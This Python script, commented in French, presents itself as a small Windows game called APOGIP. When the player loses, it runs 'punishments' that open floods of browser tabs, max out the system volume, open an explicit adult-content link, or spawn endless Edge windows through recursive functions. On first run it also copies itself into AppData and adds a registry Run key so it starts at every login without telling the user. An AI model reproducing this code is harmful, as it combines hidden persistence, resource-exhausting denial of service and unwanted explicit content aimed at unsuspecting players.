from ctypes import cast, POINTER
import tkinter as tk
from tkinter import messagebox, simpledialog
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities
import time
import random
import webbrowser
import threading 
import pygame
import subprocess
import sys 
import os
import In
import winreg as reg
if getattr(sys, 'frozen', False):
    # Si c'est le fichier .exe, on cherche dans le dossier du .exe
    dossier_du_jeu = os.path.dirname(sys.executable)
else:
    # Si c'est le script .py classique, on cherche le dossier du script
    dossier_du_jeu = os.path.dirname(os.path.abspath(__file__))
a =0
# On force Python à se positionner dans le bon dossier de travail
os.chdir(dossier_du_jeu)

nom_fichier = "Apogip.txt"
if os.path.exists(nom_fichier):
    os.remove(nom_fichier)    

pygame.init()

pygame.mixer.init()
pygame.mixer.music.set_volume(0.5)
Accueille=pygame.mixer.Sound("Accueil_Finale.mp3")
perdu=pygame.mixer.Sound("perdu_Finale.mp3")
gagner=pygame.mixer.Sound("gagne-finale.mp3")
fin1_1= pygame.mixer.Sound("fermeture.mp3")
fin1_2=pygame.mixer.Sound("fermeture1.mp3")
fin1_3=pygame.mixer.Sound("fermeture2.mp3")
fin1_4=pygame.mixer.Sound("fermeture3.mp3")
fin1_5=pygame.mixer.Sound("fermeture4.mp3")
device = AudioUtilities.GetSpeakers()
volume = device.EndpointVolume

nom_verif = "TAGRANDMERE.txt"
dossier_appdata = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'Apogip')
chemin_verif = os.path.join(dossier_appdata, nom_verif)

dEBUT=pygame.mixer.Sound("DEBUT.mp3")
dEBUT_1_1=pygame.mixer.Sound("DEBUT_1-1.mp3")
dEBUT_1_2=pygame.mixer.Sound("DEBUT_1-2.mp3")
dEBUT_2=pygame.mixer.Sound("DEBUT_2.mp3")
Douce_France=pygame.mixer.Sound("Douce-France.mp3")
Wtmw=pygame.mixer.Sound("Jim-Reeves-Welcome-To-My-World.mp3")
def punition(Puissance):
    if Puissance == 1:
        i=random.randint(1,15)
        t=0
        while i>t:
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&start_radio=1&pp=ygUJcmljayByb2xsoAcB")
            t += 1  # Très important !
        
    elif Puissance == 2:
        webbrowser.open("https://youtu.be/y1wXxB4eFEc")
        webbrowser.open("https://youtu.be/y1wXxB4eFEc")
    elif Puissance == 8:
        
        def Kaboom():
            os.system("start msedge https://www.youtube.com/watch?v=kj4LxVhx2-A")
            Kaboom()
            Kaboom()
            Kaboom1()
        def Kaboom1():
            os.system("start msedge https://www.youtube.com/watch?v=kj4LxVhx2-A")
            Kaboom1()
            Kaboom1()
            Kaboom2()
        def Kaboom2():
            os.system("start msedge https://www.youtube.com/watch?v=kj4LxVhx2-A")
            Kaboom2()
            Kaboom2()
            Kaboom3()
        def Kaboom3():
            os.system("start msedges https://www.youtube.com/watch?v=kj4LxVhx2-A")
            Kaboom3()
            Kaboom3()
            Kaboom()
        Kaboom()  
    elif Puissance == 7:
        volume.SetMasterVolumeLevelScalar(1.0, None)  # Met le son à 100%
        dossier_actuel = os.path.dirname(os.path.realpath(__file__))
        Mon = os.path.join(dossier_actuel, "video_la_plus_honteux_de_histoire.mp4")
        os.startfile(Mon)
    elif Puissance == 5:
        i=random.randint(1,15)
        t=0
        while i>t:
            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ&list=RDdQw4w9WgXcQ&start_radio=1&pp=ygUJcmljayByb2xsoAcB")
            webbrowser.open("https://youtu.be/y1wXxB4eFEc")
            webbrowser.open("https://youtu.be/y1wXxB4eFEc")
            t += 1  # Très important !
    elif Puissance == 3:
        volume.SetMasterVolumeLevelScalar(1.0, None)  # Met le son à 100%
        webbrowser.open("https://youtu.be/y1wXxB4eFEc")
        webbrowser.open("https://youtu.be/y1wXxB4eFEc")
    elif Puissance == 4:
        webbrowser.open("https://rule34.xxx/index.php?page=post&s=list&tags=hinata")

def ajouter_au_demarrage():
    # 1. On récupère le DOSSIER où se trouve le script actuel (et non le fichier)
    dossier_source = os.path.dirname(os.path.realpath(sys.argv[0]))
    
    # 2. Dossier cible dans AppData/Roaming/APOGIP
    destination = os.path.join(os.environ.get('APPDATA'), 'APOGIP')

    # 🛑 SÉCURITÉ : Si le script s'exécute DÉJÀ depuis AppData,
    # on arrête la fonction ici pour éviter de vouloir s'écraser soi-même !
    if os.path.abspath(dossier_source).lower() == os.path.abspath(destination).lower():
        return
    
    # Copie du dossier complet
    In.copiercoller(dossier_source, destination)
    
    # 3. Chemin vers le script une fois copié dans AppData
    chemin_du_fichier_copie = os.path.join(destination, 'A(sec_fen APOGIP).py')
    
    # 4. Inscription dans le Registre Windows
    nom_application = "APOGIP_Game"
    cle_registre = reg.HKEY_CURRENT_USER
    chemin_cle = r"Software\Microsoft\Windows\CurrentVersion\Run"
    
    # Commande qui indique à Windows de lancer Python avec le script
    # On utilise pythonw.exe si on ne veut pas qu'une console noire apparaisse
    executable_python = sys.executable.replace("python.exe", "pythonw.exe")
    commande = f'"{executable_python}" "{chemin_du_fichier_copie}"'
    try:
        open_cle = reg.OpenKey(cle_registre, chemin_cle, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(open_cle, nom_application, 0, reg.REG_SZ, f'"{chemin_du_fichier_copie}"')
        reg.CloseKey(open_cle)
    except Exception as e:
        print(f"Erreur lors de l'ajout au démarrage : {e}")

def commencer():
    
    dossier_actuel = os.path.dirname(os.path.realpath(__file__))
    Plateform = os.path.join(dossier_actuel, "Plateform(er_fen jeu).py")
    processus = subprocess.Popen([sys.executable, Plateform])
    fenetre()


def fenetre():
    # Dimensions de l'écran
    LARGEUR, HAUTEUR = 200, 400
    screen = pygame.display.set_mode((LARGEUR, HAUTEUR))
    try:
        Chifoumi = pygame.transform.scale2x(pygame.image.load("Chifoumi.png").convert_alpha())
    except pygame.error:
        Chifoumi = None
    running= True
    while running:
        nom_fichier = "Apogip.txt"
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_BACKSPACE and pygame.K_RETURN:
                    time.sleep(100)
        # Correction de pygame.fill par screen.fill
        screen.fill((55, 55, 55))
        screen.blit(Chifoumi, (120, 75))

        pygame.display.flip()

        if os.path.exists(nom_fichier):
            with open(nom_fichier, "r", encoding="utf-8") as fichier:
                contenu = fichier.read().strip() # .strip() enlève les espaces / sauts de ligne
                
            if contenu == "G":
                print("Victoire détectée ! Lancement de l'audio.")
                gagner.play()
                
                # ✅ ON SUPPRIME LE FICHIER pour ne jouer le son qu'UNE SEULE FOIS
                os.remove(nom_fichier)
            elif contenu == "P":
                time.sleep(1)
                perdu.play()
                time.sleep(1)
                punition(random.randint(1,7))
                # ✅ ON SUPPRIME LE FICHIER pour ne jouer le son qu'UNE SEULE FOIS
                os.remove(nom_fichier)
                
            elif contenu == "B":
                
                
                # Écriture

                fin1_1.play()
                time.sleep(1.5)
                fin1_2.play()
                time.sleep(1.5)
                fin1_3.play()
                time.sleep(1.3)
                fin1_4.play()
                time.sleep(2)
                fin1_5.play()
                time.sleep(2)
                punition(6) 
                        
    pygame.quit()
    sys.exit()

def debut():

    contenu_verif = ""
    if os.path.exists(nom_verif):
        with open(nom_verif, "r", encoding="utf-8") as fichier:
            contenu_verif = fichier.read().strip()

        if contenu_verif == "F":
            dEBUT.play()
            time.sleep(dEBUT.get_length())
            root = tk.Tk()
            root.withdraw() # Cache la fenêtre Tkinter vide
            jeaimare = messagebox.askyesno("APOGIP", "on est d'accord?")
            root.destroy()

            if jeaimare:
                pygame.mixer.stop()
                dEBUT_1_1.play()
                time.sleep(dEBUT_1_1.get_length())
                dEBUT_1_2.play()
                Wtmw.play()
                commencer()
                return
            elif not jeaimare:
                pygame.mixer.stop()
                dEBUT_2.play()
                In.pire_chose_ever()
                Douce_France.play()
                return
        else:
            Accueille.play()
            time.sleep(27.5)
            Douce_France.play()
            dossier_cible = "C:/Users/user/AppData/Roaming/Apogip"
            # S'assure que le dossier existe (s'il n'existe pas, Python le crée)
            os.makedirs(dossier_cible, exist_ok=True)
            chemin_fichier = os.path.join(dossier_cible, nom_verif)
            with open(chemin_fichier, "w", encoding="utf-8") as f:
                f.write("G")
            commencer()
            ajouter_au_demarrage()
            return
debut()